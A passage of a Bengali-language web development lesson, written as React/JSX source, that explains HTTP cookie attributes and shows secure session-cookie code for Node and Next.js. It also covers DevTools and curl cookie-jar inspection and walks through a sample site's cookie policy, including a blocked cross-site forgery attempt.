              </ContentParagraph>
              <ContentParagraph>
                এবার মাপ। প্রতিটা Cookie এর নাম আর মান মিলিয়ে মোটামুটি ৪০৯৬ Byte পর্যন্ত Browser নেয়,
                তার বেশি হলে পুরো Cookie টাই ফেলে দেয়, কাটে না। একটা Domain এর জন্য অন্তত ৫০টা Cookie
                রাখার কথা নিয়মে, আজকের Browser তার চেয়ে বেশি রাখে। কিন্তু আসল সীমাটা আসে অন্য দিক থেকে।
                প্রতিটা Cookie প্রতিটা মানানসই Request এ যায়, পাতা, ছবি, CSS, সব। ত্রিশটা Cookie, প্রতিটা
                একশো Byte, মানে প্রতিটা Request এ বাড়তি তিন KB। আর Server গুলোর Request Header এর একটা
                সীমা আছে। Node এর Default ১৬ KB, পার হলে উত্তর আসে <code>431 Request Header Fields Too
                Large</code>। Nginx এ একই সমস্যায় দেখবেন{" "}
                <code>400 Request Header Or Cookie Too Large</code>। Lab এর চার নম্বর ধাপে দুইটাই নিজে
                ঘটাবেন।
              </ContentParagraph>
              <ContentParagraph>
                মানের অক্ষর নিয়ে শেষ কথা। Random টোকেন বানাতে <code>base64url</code> ব্যবহার করুন,
                এর অক্ষরগুলো Cookie তে নিরাপদ। আর কোনো লেখা রাখতে হলে, যেমন একটা শহরের নাম,{" "}
                <code>encodeURIComponent</code> দিয়ে Encode করে রাখুন, পড়ার সময় Decode করুন।
              </ContentParagraph>
            </div>
          ),
        },
      ],
    },
    /* --------------------------------------------------------------- 12 */
    {
      id: "in-code",
      subHeader: { index: "012", title: "Cookies in Code" },
      title: <SectionTitle>Code এ Cookie: Node, fetch আর Next.js</SectionTitle>,
      blocks: [
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                এতক্ষণ যা শিখলেন, সব শেষ পর্যন্ত Code এর কয়েকটা লাইনে নামে। তিন জায়গার নিয়ম দেখি।
              </ContentParagraph>
              <ContentParagraph>
                <strong>সাধারণ Node।</strong> Node এর <code>http</code> Module এ Cookie এর জন্য
                আলাদা কিছু নেই, Cookie শুধু একটা Header। বসাতে <code>res.setHeader</code> এ একটা
                Array দিন, প্রতিটা Cookie একটা আলাদা লাইন হবে। একটা String এ সব জুড়ে দিলে Browser শুধু
                প্রথমটা চিনবে। পড়তে <code>req.headers.cookie</code>, যেটা শুধু একটা লম্বা String,
                ভাগ করার কাজ আপনার, Lab এর <code>parseCookies</code> এর মতো। Express এ এই দুই কাজ করে{" "}
                <code>res.cookie()</code> আর <code>cookie-parser</code> Package। নিচে Island Tours এর
                Login এর Cookie অংশটা, সাধারণ Node এ, শুধু ছবিটা বোঝানোর জন্য। Password যাচাই আর Redis এ
                লেখা পরের লেসনে।
              </ContentParagraph>
            </div>
          ),
        },
        {
          type: CONTENT_TYPES.CODE_BLOCK,
          language: "javascript",
          filename: "login-cookie.mjs",
          code: `import { randomBytes } from "node:crypto";

// মেয়াদ Config থেকে, Code এ কোনো সংখ্যা লেখা নেই। না থাকলে App চালুই হবে না।
const sessionTtlSeconds = Number(process.env.SESSION_TTL_SECONDS);
if (!sessionTtlSeconds) throw new Error("SESSION_TTL_SECONDS is not set");

export function setSessionCookie(res, sessionId) {
  res.setHeader("Set-Cookie", [
    \`__Host-session=\${sessionId}; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=\${sessionTtlSeconds}\`,
  ]);
}

export function clearSessionCookie(res) {
  // মোছার লাইনেও একই নাম, একই Path, আর __Host- এর জন্য Secure বাধ্যতামূলক
  res.setHeader("Set-Cookie", "__Host-session=; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=0");
}

export function newSessionId() {
  return randomBytes(32).toString("base64url"); // 256 bit, আন্দাজ করা অসম্ভব
}`,
        },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                <strong>Node এর fetch, এক Server থেকে আরেক Server এ।</strong> এখানে একটা ফাঁদ আছে
                যেটা প্রায় সবাই একবার পড়েন। Browser এর fetch এর একটা Jar আছে, Node এর fetch এর নেই।
                Server থেকে আরেকটা API কে ডাকলে উত্তরের Set-Cookie কেউ মনে রাখে না, পরের Request এ
                আপনাকে নিজে হাতে Cookie Header বানিয়ে পাঠাতে হয়। আর একটা Response এ কয়েকটা Set-Cookie
                থাকলে <code>{'headers.get("set-cookie")'}</code> সব কমা দিয়ে জুড়ে একটা String বানিয়ে ফেলে,
                যেটা আবার ঠিকভাবে ভাগ করা যায় না, কারণ তারিখের ভেতরেও কমা। আলাদা আলাদা পেতে{" "}
                <code>headers.getSetCookie()</code>। নিচের Script টা Lab এর Server এর সাথে চালানো।
              </ContentParagraph>
            </div>
          ),
        },
        {
          type: CONTENT_TYPES.CODE_BLOCK,
          language: "javascript",
          filename: "fetch-client.mjs",
          code: `// চালান:  LAB_PORT=47650 node fetch-client.mjs
const port = Number(process.env.LAB_PORT);
if (!port) throw new Error("LAB_PORT is not set");
const base = \`http://localhost:\${port}\`;

const login = await fetch(\`\${base}/login\`);
// headers.get("set-cookie") সব লাইন কমা দিয়ে জুড়ে ফেলে। আলাদা আলাদা পেতে getSetCookie()।
const lines = login.headers.getSetCookie();
console.log("Set-Cookie lines:", lines.length);

// fetch নিজে কোনো Cookie জমায় না। পরের Request এ নিজে হাতে পাঠাতে হয়।
const without = await (await fetch(\`\${base}/me\`)).json();
console.log("without Cookie header:", without.cookieHeader);

const cookieHeader = lines.map((line) => line.split(";")[0]).join("; ");
const withIt = await (await fetch(\`\${base}/me\`, { headers: { cookie: cookieHeader } })).json();
console.log("with Cookie header   :", withIt.cookieHeader.replace(/lab_session=[^;]+/, "lab_session=..."));

// এই যন্ত্রে চালানোর আসল ফলাফল:
//   Set-Cookie lines: 4
//   without Cookie header: null
//   with Cookie header   : lab_session=...; theme=dark; api_hint=1; short=1`,
        },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                শেষ লাইনটা ভালো করে দেখুন। হাতে জোড়া Cookie Header এ <code>api_hint</code> ও চলে গেল{" "}
                <code>/me</code> তে, যদিও তার Path ছিল <code>/api</code>। নিজে হাতে Cookie পাঠালে
                Browser এর সব নিয়ম, Domain, Path, Secure, মেয়াদ, আপনাকেই মানতে হয়, নাহলে ভুল Cookie
                ভুল জায়গায় যায়। Server থেকে Server এ কথা বলার জন্য তাই Cookie এর চেয়ে লেসন ০৬ এর{" "}
                <code>Authorization</code> Header অনেক সহজ।
              </ContentParagraph>
              <ContentParagraph>
                <strong>Next.js।</strong> Island Tours এর Frontend Next.js এ। এই Project এর Next.js
                এর নিজের নথি অনুযায়ী <code>cookies()</code> আসে <code>next/headers</code> থেকে, আর এটা
                একটা <code>async</code> Function, তাই <code>await</code> লাগে। Cookie পড়া যায়
                যেকোনো Server Component এ, কারণ Browser এর পাঠানো Cookie Header টা Server এর হাতেই
                আছে। কিন্তু বসানো আর মোছা যায় শুধু Route Handler বা Server Function এ, কারণ ততক্ষণে
                পাতা পাঠানো শুরু হয়ে গেলে আর Header যোগ করা যায় না। আর পাতায় <code>cookies()</code>{" "}
                পড়লেই সেই পাতা প্রতিটা Request এ নতুন করে তৈরি হয়, Cache থেকে আসে না। নিচের ফাইলটা
                আপনার নিজের Project এ বসানোর নমুনা।
              </ContentParagraph>
            </div>
          ),
        },
        {
          type: CONTENT_TYPES.CODE_BLOCK,
          language: "typescript",
          filename: "app/api/auth/session/route.ts",
          code: `import { cookies } from "next/headers";
import { randomBytes } from "node:crypto";

const sessionTtlSeconds = Number(process.env.SESSION_TTL_SECONDS);
if (!sessionTtlSeconds) throw new Error("SESSION_TTL_SECONDS is not set");

const SESSION_COOKIE = "__Host-session";
const BASE = { httpOnly: true, secure: true, sameSite: "lax", path: "/" } as const;

// Login: Password যাচাই আর Redis এ Session লেখা হয়ে গেছে ধরে নিয়ে (লেসন ০৬)
export async function POST() {
  const sessionId = randomBytes(32).toString("base64url");
  const cookieStore = await cookies();
  cookieStore.set(SESSION_COOKIE, sessionId, { ...BASE, maxAge: sessionTtlSeconds });
  return Response.json({ signedIn: true });
}

// Logout: একই নাম, একই Path, Secure সহ, Max-Age শূন্য
export async function DELETE() {
  const cookieStore = await cookies();
  cookieStore.set(SESSION_COOKIE, "", { ...BASE, maxAge: 0 });
  return new Response(null, { status: 204 });
}`,
        },
        {
          type: CONTENT_TYPES.INFO_BOX,
          variant: INFO_BOX_VARIANTS.TIP,
          title: "মোছার নিয়ম এক লাইনে",
          content: (
            <p>
              Browser এ একটা Cookie মোছার কোনো আলাদা আদেশ নেই। মোছা মানে একই পরিচয়ের নতুন একটা
              Cookie পাঠানো, যার মেয়াদ এখনই শেষ। পরিচয় মানে সেকশন ০০৩ এর তিনজোড়া: একই নাম, একই
              Domain (লেখা না থাকলে লেখা নেই), একই Path। তার সাথে <code>Max-Age=0</code>। Prefix থাকলে
              তার শর্তও। মান কী দিলেন তাতে কিছু আসে যায় না। তিনটার একটা না মিললে Browser নতুন একটা
              মরা Cookie বানায় আর পুরনোটা দিব্যি থেকে যায়, Lab এর চার নম্বর ধাপে ঠিক এটা দেখবেন।
            </p>
          ),
        },
      ],
    },
    /* --------------------------------------------------------------- 13 */
    {
      id: "storage-compare",
      subHeader: { index: "013", title: "Cookie vs Web Storage" },
      title: <SectionTitle>Cookie, localStorage আর sessionStorage: কোনটা কীসের জন্য</SectionTitle>,
      blocks: [
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <ContentParagraph>
              Browser এ কিছু রেখে দেওয়ার জায়গা Cookie একা নয়। আরও দুইটা আছে, localStorage আর
              sessionStorage, যাদের একসাথে বলে Web Storage। তিনটার তফাত একটা প্রশ্নে: এই জিনিসটা কি
              Server এর দরকার, নাকি শুধু পাতার?
            </ContentParagraph>
          ),
        },
        {
          type: CONTENT_TYPES.COMPARE_TABLE,
          headers: ["", "Cookie", "localStorage", "sessionStorage"],
          rows: [
            ["Server এ যায়?", "হ্যাঁ, প্রতিটা মানানসই Request এ, নিজে থেকে", "কখনো না, পাঠাতে হলে নিজে পাঠাতে হয়", "কখনো না"],
            ["মাপ", "প্রায় ৪ KB প্রতিটা", "প্রতি Origin এ কয়েক MB", "প্রতি Origin এ কয়েক MB"],
            ["JavaScript পড়তে পারে?", "হ্যাঁ, HttpOnly না হলে", "সবসময়, তাই XSS এ ফাঁস হয়", "সবসময়"],
            ["কতদিন", "Max-Age পর্যন্ত, অথবা Browser বন্ধ পর্যন্ত", "মোছা না পর্যন্ত", "Tab বন্ধ পর্যন্ত"],
            ["কার জন্য আলাদা", "Host আর Path, Port দেখে না", "প্রতিটা Origin, Port সহ", "প্রতিটা Origin, আর প্রতিটা Tab"],
            ["কী রাখবেন", "Login এর টোকেন, Server এর দরকারি পছন্দ", "পাতার পছন্দ, খসড়া লেখা", "এক Tab এর সাময়িক জিনিস, যেমন একটা Form এর ধাপ"],
          ],
        },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                Login এর টোকেন localStorage এ রাখা একটা প্রচলিত অভ্যাস, আর সেটা নিয়ে তর্কও প্রচুর।
                localStorage পাতার যেকোনো Script পড়তে পারে, তাই একটা XSS মানেই টোকেন চুরি। HttpOnly
                Cookie তে Script টোকেন ছুঁতেই পারে না। এই তর্কের পুরোটা, কোন অবস্থায় কোনটা, পরের লেসনে
                Session আর JWT এর সাথে।
              </ContentParagraph>
              <ContentParagraph>
                Theme এর মতো জিনিসে একটা মজার ব্যাপার আছে। পছন্দটা localStorage এ রাখলে Server জানে না,
                তাই পাতা প্রথমে সাদা আসে, তারপর Script চলে অন্ধকার করে, চোখে একটা ঝলক লাগে। Cookie তে
                রাখলে Server প্রথম থেকেই অন্ধকার পাতা পাঠাতে পারে। Island Tours এর <code>theme</code>{" "}
                Cookie তে থাকার কারণ এটাই।
              </ContentParagraph>
            </div>
          ),
        },
        {
          type: CONTENT_TYPES.INFO_BOX,
          variant: INFO_BOX_VARIANTS.CONCEPT,
          title: "Cookie Banner কোথা থেকে এলো",
          content: (
            <p>
              ইউরোপের সাইটে ঢুকলেই যে Cookie এর অনুমতি চাওয়া পর্দা আসে, সেটা Browser এর নিয়ম নয়,
              আইনের। ইউরোপীয় ইউনিয়নের ePrivacy আর GDPR এর নিয়মে, সাইট চালানোর জন্য একান্ত দরকারি
              নয় এমন Cookie, যেমন বিজ্ঞাপন বা পরিসংখ্যানের Tracking, বসানোর আগে মানুষের অনুমতি নিতে
              হয়। Login বা ঝুড়ির মতো দরকারি Cookie এর জন্য অনুমতি লাগে না। আপনার ব্যবহারকারীরা কোন দেশে,
              সেখানকার আইন কী বলে, সেটা দেখে নেওয়া আপনার দায়িত্ব। Island Tours ইউরোপ থেকে আসা
              পর্যটকদের Tracking Cookie বসায় শুধু অনুমতির পরে।
            </p>
          ),
        },
      ],
    },
    /* --------------------------------------------------------------- 14 */
    {
      id: "hands-on",
      subHeader: { index: "014", title: "See It Yourself" },
      title: <SectionTitle>নিজের চোখে দেখা: DevTools আর curl</SectionTitle>,
      blocks: [
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                Cookie এর সমস্যা ধরার দুইটা যন্ত্র, Browser এর DevTools আর curl। দুইটাই প্রতিদিনের কাজে
                লাগবে, তাই এখনই হাত পাকিয়ে নিন। Chrome এ যেকোনো সাইট খুলে <code>F12</code>, অথবা
                Mac এ <code>Cmd+Option+I</code>।
              </ContentParagraph>
              <ContentList>
                <ListItem>
                  <strong>Application Panel, তারপর বাঁয়ে Storage এর নিচে Cookies:</strong> সাইটের
                  নাম বেছে নিলে Jar এর পুরো ছক দেখবেন। Name, Value, Domain, Path, Expires / Max-Age,
                  Size, HttpOnly, Secure, SameSite, Partition Key, Priority। এই লেসনের প্রায় প্রতিটা
                  শব্দ এখানে একটা কলাম। কোনো ঘরে Double Click করে মান বদলানো যায়, Delete চেপে মোছা যায়,
                  আর উপরের Filter এ নাম লিখে খোঁজা যায়।
                </ListItem>
                <ListItem>
                  <strong>Network Panel, একটা Request বেছে Cookies Tab:</strong> এই Request এ কোন
                  Cookie গেল আর উত্তরে কোন Set-Cookie এলো, দুইটা আলাদা ছকে। সবচেয়ে কাজের অংশটা হলো,
                  কোনো Cookie Browser না পাঠালে বা না নিলে Chrome সেখানে একটা হলুদ চিহ্ন দেখায়, আর
                  Mouse রাখলে কারণটা লেখা থাকে, যেমন SameSite এর কারণে বাদ, বা Secure ছাড়া SameSite=None।
                  Cookie না যাওয়ার রহস্যের অর্ধেক এখানেই মেটে।
                </ListItem>
                <ListItem>
                  <strong>Console:</strong> <code>document.cookie</code> লিখে Enter। এই পাতার Script
                  যা দেখতে পায় শুধু সেটুকু আসবে, HttpOnly গুলো বাদ, আর অন্য Path এর গুলোও বাদ।
                </ListItem>
              </ContentList>
              <ContentParagraph>
                curl এর নিজের একটা Jar আছে, একটা সাধারণ Text ফাইল। <code>-c ফাইল</code> মানে উত্তরের
                সব Set-Cookie এই ফাইলে লিখে রাখো। <code>-b ফাইল</code> মানে ফাইলের যে Cookie গুলো এই
                URL এ মেলে, সেগুলো পাঠাও। curl ও Domain, Path, Secure, মেয়াদ আর Prefix এর নিয়ম মানে, তাই
                Browser ছাড়াই অনেক কিছু পরীক্ষা করা যায়। একটা জিনিস বাদে: curl SameSite মানে না, কারণ
                curl এ কোনো পাতাই নেই যেখান থেকে Request শুরু হবে। Lab এর Server এর বিরুদ্ধে চালানো আসল
                Jar টা এরকম।
              </ContentParagraph>
            </div>
          ),
        },
        {
          type: CONTENT_TYPES.CODE_BLOCK,
          language: "bash",
          filename: "jar.txt, এই যন্ত্রের আসল ফাইল",
          code: `$ curl -s -c jar.txt http://localhost:47650/login
$ grep -v '^# ' jar.txt | grep -v '^$'
localhost	FALSE	/	FALSE	1793428732	short	1
localhost	FALSE	/api	FALSE	0	api_hint	1
localhost	FALSE	/	FALSE	1824964727	theme	dark
#HttpOnly_localhost	FALSE	/	FALSE	0	lab_session	yUNEd7...`,
        },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <ContentParagraph>
              প্রতিটা লাইনে সাতটা ঘর, Tab দিয়ে ভাগ: Domain, Subdomain ও পাবে কি না (TRUE বা FALSE),
              Path, শুধু HTTPS এ যাবে কি না, মেয়াদ শেষের মুহূর্ত Unix সময়ে (শূন্য মানে Session
              Cookie), নাম আর মান। HttpOnly Cookie এর লাইনের শুরুতে <code>#HttpOnly_</code> জোড়া
              থাকে। <code>short</code> এর মেয়াদের সংখ্যাটা বাকিদের চেয়ে ছোট, কারণ তার Max-Age মাত্র
              ৫ সেকেন্ড।
            </ContentParagraph>
          ),
        },
        {
          type: CONTENT_TYPES.INFO_BOX,
          variant: INFO_BOX_VARIANTS.WARNING,
          title: "কারো Cookie কাউকে দেখাবেন না",
          content: (
            <p>
              সাহায্য চাইতে গিয়ে অনেকে DevTools এর Screenshot বা curl এর পুরো Output দলের Chat এ
              দিয়ে দেন। Login Cookie এর মান থাকলে সেটা আপনার Account এর চাবি দিয়ে দেওয়া। Screenshot
              বা Log শেয়ার করার আগে মানগুলো ঢেকে দিন, এই লেসনে যেভাবে <code>Gx2f9Q...</code> লেখা
              হয়েছে। আর ভুল করে ফাঁস হয়ে গেলে সাথে সাথে Logout করুন, যাতে Server এর দিকে Session টাই
              মুছে যায়।
            </p>
          ),
        },
      ],
    },
    /* --------------------------------------------------------------- 15 */
    {
      id: "project",
      subHeader: { index: "015", title: "Project Example" },
      title: <SectionTitle>Island Tours এর Cookie তালিকা, আর প্রতিটার পেছনের কারণ</SectionTitle>,
      blocks: [
        { type: CONTENT_TYPES.CUSTOM, component: <IslandToursBrief /> },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <ContentParagraph>
              Island Tours এর দল বছরে একবার সাইটের প্রতিটা Cookie এর একটা তালিকা বানায়, আর প্রতিটার
              পাশে লেখে কেন আছে। নতুন কেউ একটা Cookie যোগ করতে চাইলে আগে এই তালিকায় একটা সারি লিখতে
              হয়। তালিকাটা এরকম।
            </ContentParagraph>
          ),
        },
        {
          type: CONTENT_TYPES.COMPARE_TABLE,
          headers: ["Cookie", "Attribute", "কেন এভাবে"],
          rows: [
            [
              <code key="a">__Host-session</code>,
              <code key="b">Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=1209600</code>,
              "Login। Host-only, তাই Blog আর Admin পায় না। Lax, তাই WhatsApp এর Link এ ক্লিক করে এলেও Login থাকে, কিন্তু অন্য সাইটের POST এ যায় না। Redis এর Session এর TTL ও ১৪ দিন",
            ],
            [
              <code key="a">__Host-admin_session</code>,
              <code key="b">Path=/; Secure; HttpOnly; SameSite=Strict; Max-Age=28800</code>,
              "admin.islandtours.example এর কর্মীদের Login। Strict, কারণ অন্য কোথাও থেকে Admin এ আসার কোনো ভালো কারণ নেই। ৮ ঘণ্টা, একটা কাজের দিন",
            ],
            [
              <code key="a">theme</code>,
              <code key="b">Path=/; SameSite=Lax; Max-Age=31536000; Secure</code>,
              "অন্ধকার না আলো। HttpOnly নয়, কারণ পাতার Script ও বদলায়। Server প্রথম থেকেই ঠিক রঙের পাতা পাঠায়",
            ],
            [
              <code key="a">lang</code>,
              <code key="b">Domain=islandtours.example; Path=/; SameSite=Lax; Max-Age=31536000; Secure</code>,
              "ভাষা। পুরো তালিকায় একমাত্র Domain Cookie, কারণ Blog ও একই ভাষায় দেখাতে চায়, আর এতে গোপন কিছু নেই",
            ],
            [
              <code key="a">__Host-widget_cart</code>,
              <code key="b">Path=/; Secure; HttpOnly; SameSite=None; Partitioned</code>,
              "seagulltours.example এর ভেতরের Widget এর বেছে রাখা ট্যুর। Partitioned, তাই শুধু সেই Partner সাইটের ভেতরেই চলে",
            ],
          ],
        },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>তালিকার বাইরে চারটা নিয়ম, যেগুলো Code Review তে দেখা হয়।</ContentParagraph>
              <ContentList>
                <ListItem>
                  <strong>প্রতিটা বদলানোর Request এ Origin যাচাই।</strong> সেকশন ০০৯ এর মতো, অনুমোদিত
                  Origin আসে <code>ALLOWED_ORIGINS</code> থেকে। Blog সেই তালিকায় নেই।
                </ListItem>
                <ListItem>
                  <strong>Login হলেই নতুন Session নম্বর।</strong> Login এর আগে কোনো Session Cookie
                  থাকলেও সেটা ফেলে নতুন একটা বসানো হয়। কেন, তার নাম Session Fixation, পরের লেসনে।
                </ListItem>
                <ListItem>
                  <strong>Logout মানে দুই জায়গায় মোছা।</strong> Redis থেকে Session টা মুছে ফেলা, আর
                  Browser কে মোছার Set-Cookie পাঠানো, Secure আর Path=/ সহ। শুধু Cookie মুছলে কেউ পুরনো
                  মানটা আগেই কপি করে রাখলে সেটা দিয়ে তখনো ঢোকা যেত।
                </ListItem>
                <ListItem>
                  <strong>Mobile App Cookie ব্যবহার করে না।</strong> Android App টা প্রতিটা Request এ{" "}
                  <code>Authorization</code> Header এ একটা ১৫ মিনিটের টোকেন পাঠায়। কেন আলাদা, সেটাই পরের
                  লেসনের মূল প্রশ্ন।
                </ListItem>
              </ContentList>
            </div>
          ),
        },
      ],
    },
    /* --------------------------------------------------------------- 16 */
    {
      id: "request-flow",
      subHeader: { index: "016", title: "Step-by-step Flow" },
      title: <SectionTitle>Login থেকে Logout, একটা Cookie এর পুরো জীবন</SectionTitle>,
      blocks: [
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <ContentParagraph>
              পর্যটকের ফোন <code>192.168.1.20</code>, বাসার Router এর বাইরের ঠিকানা{" "}
              <code>203.0.113.25</code>, Island Tours এর Server <code>103.94.135.2:443</code>। একটা
              Cookie এর জন্ম থেকে মৃত্যু পর্যন্ত, ধাপে ধাপে।
            </ContentParagraph>
          ),
        },
        {
          type: CONTENT_TYPES.STEP_FLOW,
          stepName: "ধাপ",
          steps: [
            {
              title: "পর্যটক Login Form জমা দেন",
              description:
                "https://islandtours.example/login পাতা থেকে Browser পাঠাল POST /api/auth/login। এটা Same-origin, Jar এ এখনো এই সাইটের কোনো Session Cookie নেই। Caddy TLS খুলে Request টা 127.0.0.1:3000 এ App এর কাছে দিল।",
            },
            {
              title: "App একটা নতুন Session বানায়",
              description:
                "Password মিলল। App crypto.randomBytes(32) দিয়ে একটা Random নম্বর বানাল, Redis এ লিখল এই নম্বর মানে usr_42, TTL ১৪ দিন। কীভাবে আর কেন, পরের লেসনে।",
            },
            {
              title: "Set-Cookie ফেরত যায়",
              description:
                "উত্তরে Set-Cookie: __Host-session=Gx2f9Q...; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=1209600। Caddy লাইনটা ছোঁয় না।",
            },
            {
              title: "Browser যাচাই করে Jar এ রাখে",
              description:
                "Browser দেখল নামে __Host- আছে, তাই শর্তগুলো মেলাল: পাতাটা HTTPS, Secure আছে, Path=/, Domain নেই। সব মিলেছে, Cookie টা Jar এ গেল, Host-only, ১৪ দিনের মেয়াদ।",
            },
            {
              title: "পরের প্রতিটা পাতায় Cookie যায়",
              description:
                "পর্যটক /tours/saint-martin খুললেন। Browser Jar এর প্রতিটা Cookie কে প্রশ্ন করল: Host হুবহু islandtours.example? Path / দিয়ে শুরু? HTTPS? Same-site? চারটাই হ্যাঁ, তাই Cookie Header এ জুড়ে দিল। App Redis এ খুঁজে usr_42 পেল আর নাম সহ পাতা পাঠাল।",
            },
            {
              title: "Blog এ গেলে Cookie যায় না",
              description:
                "পর্যটক blog.islandtours.example এর একটা লেখা খুললেন। Cookie টা Host-only, তাই Browser এখানে পাঠাল না। Blog এর Server Login টোকেনটা কখনো দেখল না। গেল শুধু lang, কারণ সেটা Domain Cookie।",
            },
            {
              title: "attacker.example এর জাল Form ব্যর্থ হয়",
              description:
                "একটা Email এর Link থেকে খোলা পাতা লুকিয়ে POST /bookings/bk_7Q2M9X/cancel পাঠাল। এটা Cross-site POST, Cookie Lax, তাই Browser Cookie দিল না, App উত্তর দিল 401। Cookie গেলেও Origin https://attacker.example তালিকায় নেই, উত্তর হতো 403।",
            },
            {
              title: "Logout এ দুই জায়গা থেকেই মোছা",
              description:
                "পর্যটক Logout চাপলেন। App Redis থেকে Session টা মুছল, আর পাঠাল Set-Cookie: __Host-session=; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=0। একই নাম, একই Path, Secure সহ, তাই Browser পুরনোটা মুছে ফেলল। এখন টোকেনটা কোথাও নেই, কেউ কপি করে রাখলেও Redis এ তার কোনো মানে নেই।",
            },
          ],
        },
      ],
    },
    /* --------------------------------------------------------------- 17 */
    {
      id: "resources",
      subHeader: { index: "017", title: "Best Resources" },
      title: <SectionTitle>আরও দেখতে চাইলে</SectionTitle>,
      blocks: [
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <ContentList>
              <ListItem>
                <strong>নিচের Lab টা আগে করুন</strong>, ছয়টা ধাপে Set-Cookie, Jar, Path, Domain, মোছা,
                মাপের সীমা, HttpOnly আর SameSite সব নিজের যন্ত্রে ঘটিয়ে দেখবেন।
              </ListItem>
              <ListItem>
                <strong>MDN, Using HTTP cookies</strong>, প্রতিটা Attribute এর সংজ্ঞা আর Browser এর
                সমর্থনের ছক এক জায়গায়।{" "}
                <a
                  href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies"
                  target="_blank"
                  rel="noopener noreferrer"
                  className={linkClass}
                >
                  developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
                </a>
              </ListItem>
              <ListItem>
                <strong>RFC 6265 আর তার নতুন খসড়া RFC 6265bis</strong>, Cookie এর আসল নিয়মের কাগজ।
                Domain আর Path মেলানোর নিয়ম, ৪০০ দিনের সীমা আর Prefix এখানে।{" "}
                <a
                  href="https://www.rfc-editor.org/rfc/rfc6265"
                  target="_blank"
                  rel="noopener noreferrer"
                  className={linkClass}
                >
                  rfc-editor.org/rfc/rfc6265
                </a>
                {" আর "}
                <a
                  href="https://datatracker.ietf.org/doc/draft-ietf-httpbis-rfc6265bis/"
                  target="_blank"
                  rel="noopener noreferrer"
                  className={linkClass}
                >
                  datatracker.ietf.org/doc/draft-ietf-httpbis-rfc6265bis
                </a>
              </ListItem>
              <ListItem>
                <strong>web.dev, SameSite cookies explained</strong>, Strict, Lax আর None এর ছবি সহ
                ব্যাখ্যা।{" "}
                <a
                  href="https://web.dev/articles/samesite-cookies-explained"
                  target="_blank"
                  rel="noopener noreferrer"
                  className={linkClass}
                >
                  web.dev/articles/samesite-cookies-explained
                </a>
              </ListItem>
              <ListItem>
                <strong>OWASP CSRF Prevention Cheat Sheet</strong>, CSRF আটকানোর প্রতিটা কৌশল, কোনটা
                কখন যথেষ্ট আর কখন নয়।{" "}
                <a
                  href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"
                  target="_blank"
                  rel="noopener noreferrer"
                  className={linkClass}
                >
                  cheatsheetseries.owasp.org
                </a>
              </ListItem>
              <ListItem>
                <strong>Public Suffix List</strong>, কোন নাম Registrable Domain আর কোনটা Suffix, তার
                আসল তালিকা।{" "}
                <a href="https://publicsuffix.org" target="_blank" rel="noopener noreferrer" className={linkClass}>
                  publicsuffix.org
                </a>
              </ListItem>
              <ListItem>
                <strong>Next.js cookies নথি</strong>, আপনার Next.js এর সংস্করণের সাথে মিলিয়ে পড়ুন।
                এই Project এ সেটা আছে <code>node_modules/next/dist/docs/</code> এর ভেতরে।{" "}
                <a
                  href="https://nextjs.org/docs/app/api-reference/functions/cookies"
                  target="_blank"
                  rel="noopener noreferrer"
                  className={linkClass}
                >
                  nextjs.org/docs/app/api-reference/functions/cookies
                </a>
              </ListItem>
              <ListItem>
                <strong>CHIPS প্রস্তাব</strong>, Partitioned Cookie কেন আর কীভাবে।{" "}
                <a
                  href="https://github.com/privacycg/CHIPS"
                  target="_blank"
                  rel="noopener noreferrer"
                  className={linkClass}
                >
                  github.com/privacycg/CHIPS
                </a>
              </ListItem>
            </ContentList>
          ),
        },
      ],
    },
    /* --------------------------------------------------------------- 18 */
    {
      id: "recap",
      subHeader: { index: "018", title: "Recap" },
      title: <SectionTitle>৫ মিনিটে পুরো লেসন</SectionTitle>,
      blocks: [
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentList>
                <ListItem>
                  HTTP কিছু মনে রাখে না। Cookie হলো একটা নাম আর মানের জোড়া, যেটা Server রাখতে বলে আর
                  Browser প্রতিটা মানানসই Request এ নিজে ফেরত পাঠায়। নোট থাকে Browser এ, নোটের মানে
                  থাকে Server এ।
                </ListItem>
                <ListItem>
                  Set-Cookie যায় Response এ, প্রতিটা Cookie এর জন্য আলাদা লাইন। Cookie ফেরে Request
                  এ, এক লাইনে, শুধু নাম আর মান। Attribute গুলো একমুখী।
                </ListItem>
                <ListItem>
                  Max-Age না থাকলে Session Cookie, আছে তো Persistent। সর্বোচ্চ ৪০০ দিন। নিরাপত্তার
                  মেয়াদ Server এর দিকেও রাখুন।
                </ListItem>
                <ListItem>
                  Domain না লিখলে Host-only, লিখলে Subdomain ও পায়। Path মেলে পুরো ভাগ ধরে। Port এর
                  কোনো হিসাব নেই।
                </ListItem>
                <ListItem>
                  Secure পথের মাঝের চোর আটকায়, HttpOnly পাতার Script এর চুরি। কোনোটাই CSRF আটকায় না।
                </ListItem>
                <ListItem>
                  Origin মানে Scheme, Host, Port। Site মানে Scheme আর Registrable Domain। CORS চলে
                  Origin দিয়ে, SameSite চলে Site দিয়ে।
                </ListItem>
                <ListItem>
                  Strict কখনো না, Lax শুধু Top-level GET এ, None সব জায়গায় কিন্তু Secure সহ। নিজে
                  লিখুন, Default এ Browser গুলো একমত নয়। GET দিয়ে কিছু বদলাবেন না।
                </ListItem>
                <ListItem>
